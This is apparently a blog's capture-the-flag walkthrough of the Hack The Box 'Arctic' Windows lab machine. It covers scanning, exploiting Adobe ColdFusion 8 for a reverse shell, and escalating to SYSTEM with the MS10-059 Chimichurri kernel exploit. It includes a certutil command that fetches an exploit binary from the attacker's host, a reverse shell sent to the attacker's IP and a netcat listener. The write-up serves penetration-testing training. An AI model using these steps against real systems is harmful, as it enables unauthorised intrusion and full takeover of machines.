# Hack The Box Arctic - Walkthrough

Welcome to the first walkthrough on this blog - Today we will focus on Arctic - a Windows Box that will test your methodology and gives you a chance to grow as a penetration tester / ethical hacker. 

The way I approach CTF machines is very much a go to grow mentality. When I started 6 months ago, I did not know how to collect the necessary information to enumerate, let alone compromise any machine/environment. Trial and error is the best friend during this journey and I will share my errors with you, so you don't have to necessarily make all the same mistakes I did. 

# Mindset
Your mental model is the most important thing you potentially don't have yet but might need to develop. 
It is about abstracting the things you want to explore - e.g. if you find a webserver and that one is also a mailserver in your head you could create a mental model of the attack surface - what can you try, which possibilities for compromise are you aware of and how can you exploit these potentially. 
Follow your methodology, it is the strongest supporter for you. 

if you want to follow my methodology, feel free to copy this this template: 
https://maikroservice.notion.site/CTF-TEMPLATE-1d8ada6a7df441e9a5976e51c1d74fac

## Ping
The first thing I normally do is to check the ICMP response by pinging the box. The result you receive back will show potentially valuable information e.g. the TTL (time to live), if this is around 127 it is a windows box most likely, while numbers around 64 indicate a linux based machine.
```bash
ping 10.10.10.11
``` 

This box does not respond to ping - *Windows boxes sometimes don't respond to ping unless it is enabled AFAIK, so probably this is the reason why we do not get a response here.*

## Port Scan
Next up is the classical port scan, you can use nmap or rustscan or other tools to identify open ports. This scan is usually done in an incremental manner, nmap scans the top 1000 ports by default and with the flags used below will enumerate Versions (-sV) and run default scripts (-sC), these two can be combined to -sCV. 
T4 indicates the speed with which the scan is conducted, it goes from T1 (slow) to T5 (fast).
Since the box does not respond to ping we use the -Pn option to skip the host discovery part of the scan. 
Finally, the output should be saved to a file in a "normal" format and this is achieved by using -oN followed by the file name - I usually use \*.initial for the top 1000 scan, \*.full for the full 65535 TCP ports and \*.udp for UDP scans. 

```bash
nmap -sCV -T4 -Pn 10.10.10.11 -oN arctic.initial
``` 

We get back a result with three open ports, two out of those are fairly common (135 & 49154, both associated with Windows remote procedure call - RPC) - from experience those are fairly rarely involved in exploits directly so lets first focus on **low hanging fruits**, namely port 8500. 
Whenever I see a uncommon port as the only source I open it in my browser via `<ip>:<port>` - so in this case `10.10.10.11:8500`, which reveals Adobe Coldfusion. Let's check if there are any known exploits for that. 

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 19:41 CEST
Nmap scan report for 10.10.10.11
Host is up (0.038s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
``` 

## Service Enumeration / Exploit 
We did find Adobe Coldfusion (v8) via the last step and use exploit-db.com to check for any known exploits. We find https://www.exploit-db.com/exploits/50057 and modify it to include our virtual network interface IP (usually accessible via `ifconfig tun0`).

```bash
lhost = "10.10.16.4"
lport = 4444
rhost = "10.10.10.11"
rport = 8500
```

Once we did that we can fire the exploit and catch a reverse shell as `tolis` and find the user.txt flag on their Desktop.
```
c:\Users\tolis\Desktop>dir
dir
user.txt
```

## Post Exploitation
on the machine we are greeted with a command prompt of a very old windows 

```
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.
```

This indicates a kernel exploit - we can check for some and in the end find MS10-059 or Chimichurri (https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059: Chimichurri/Compiled) as a suitable candidate. Lets download the precompiled binary and upload it to the target.

A suitable method to do that is a python webserver on your local machine, I use the python 3 version via:
```bash
python3 -m http.server 8080
```
and then 
```
certutil -urlcache -f http://<myMachineIP>:8080/chimichurri.exe
```
to download the file on the target machine. Typical folders where this can be executed are the Document/Download folder of the compromised user and the c:\windows\temp folder. 
Other options would be impacket's smbserver or smtp/sftp (we will explore the impacket-smbserver on the next machine)  

Back to Chimichurri - The exploit, when executed targets the Tracing Service of Windows (more details here: https://itm4n.github.io/chimichurri-reloaded/) and is able to elevate out privileges to NT Authority\System. 
Let's try that and provide our local IP and a port to catch the shell on -
```bash
Chimichurri.exe 10.10.14.18 9001
/Chimichurri/-->This exploit gives you a Local System shell 
/Chimichurri/-->Changing registry values...
/Chimichurri/-->Got SYSTEM token...
/Chimichurri/-->Running reverse shell...
/Chimichurri/-->Restoring default registry values...
```

We can now read the `root.txt` and have rooted the box. Good job. 
```
nc -lvnp 9001                          
listening on [any] 9001 ...            
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.11] 49440                          
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Users\tolis\AppData\Local\Temp>whoami
whoami
nt authority\system
C:\Users\Administrator\Desktop>dir
dir
root.txt
```